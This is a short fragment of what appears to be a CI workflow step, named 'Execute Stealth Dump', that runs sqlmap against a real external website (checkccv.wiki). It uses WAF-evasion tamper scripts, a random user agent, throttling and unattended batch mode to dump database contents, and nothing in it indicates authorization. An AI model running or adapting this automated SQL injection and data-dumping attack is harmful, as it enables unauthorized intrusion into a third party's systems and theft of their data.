- name: Execute Stealth Dump with 0.5s Delay
      run: |
        cd sqlmap-dev
        python3 sqlmap.py -u "https://checkccv.wiki/?action=home&category=5" \
          --random-agent \
          --tamper=space2comment,between,randomcase \
          --delay=0.5 \
          --threads=1 \
          --level=3 \
          --risk=2 \
          --dump \
          --start=1 \
          --stop=10 \
          --batch
